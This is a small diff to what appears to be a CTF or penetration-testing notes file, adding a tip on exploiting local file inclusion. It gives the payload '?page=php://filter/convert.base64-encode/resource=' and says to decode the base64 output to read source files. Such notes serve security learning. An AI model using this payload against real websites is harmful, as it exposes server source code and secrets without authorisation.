@@ -17,3 +17,10 @@ echo *paste* | base64 -d > script.sh
 
 
 This will get you a hold of the script. You can further reverse the file.
+<br>
+
+<h1>Trying To Exploit An LFI:</h1><br>
+Use:<br>
+?page=php://filter/convert.base64-encode/resource=
+<br>
+Decode the base64 text. Will help a lot.
